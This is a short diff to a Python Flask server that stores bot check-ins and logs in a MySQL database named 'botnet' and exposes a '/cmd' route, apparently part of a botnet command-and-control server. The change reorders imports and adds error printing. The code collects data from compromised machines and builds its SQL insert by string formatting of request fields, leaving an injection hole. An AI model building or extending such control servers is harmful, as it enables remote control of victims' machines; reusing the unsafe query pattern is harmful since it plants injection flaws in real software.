@@ -1,8 +1,7 @@
-import socket
 import MySQLdb
-import time
 from base64 import b64encode as b64en, b64decode as b64de
 from flask import Flask, request
+import time
 
 app = Flask(__name__)
 db = MySQLdb.connect(host="localhost",user="root",passwd="", db="botnet")
@@ -19,7 +18,8 @@ def index():
 			cursor.execute("INSERT INTO bots(id,log) VALUES (\"{0}\", \"{1}\")".format(request.form['id'],request.form['log']))
 			db.commit()
 			return "OK"
-		except:
+		except Exception as e: 
+			print(str(e) + " -> " + "\n\n" + str(request.values.to_dict(flat=False)))
 			return "NOT OK"
 
 @app.route('/cmd', methods=['GET'])
